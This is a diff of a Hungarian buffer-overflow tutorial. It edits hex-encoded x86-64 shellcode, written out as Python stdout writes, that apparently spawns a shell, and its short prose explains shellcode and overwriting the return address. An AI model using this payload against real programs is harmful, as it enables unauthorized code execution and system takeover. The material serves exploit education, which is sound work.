@@ -356,8 +356,6 @@ ff2f6269
 4831c050
 574889e6
 b03b0f05
-6a015f6a
-3c580f05
 ```
 
 Az ilyen típusú bináris programrészlet neve shell-kód.
@@ -367,6 +365,7 @@ fér be, így csak a visszatérési cím után tudjuk elhelyezni. Így a visszat
 kell beszúrni:
 
 ```python
+sys.stdout.buffer.write(bytes.fromhex('904831c0'))
 sys.stdout.buffer.write(bytes.fromhex('4831ffb0'))
 sys.stdout.buffer.write(bytes.fromhex('690f0548'))
 sys.stdout.buffer.write(bytes.fromhex('31d248bb'))
@@ -377,9 +376,6 @@ sys.stdout.buffer.write(bytes.fromhex('534889e7'))
 sys.stdout.buffer.write(bytes.fromhex('4831c050'))
 sys.stdout.buffer.write(bytes.fromhex('574889e6'))
 sys.stdout.buffer.write(bytes.fromhex('b03b0f05'))
-sys.stdout.buffer.write(bytes.fromhex('6a015f6a'))
-sys.stdout.buffer.write(bytes.fromhex('3c580f05'))
-
 ```
 
 Most már csak az ugrási címet kell átírni. Ezt a stack listájának segítségével nyerhetjük ki. A címet természetesen
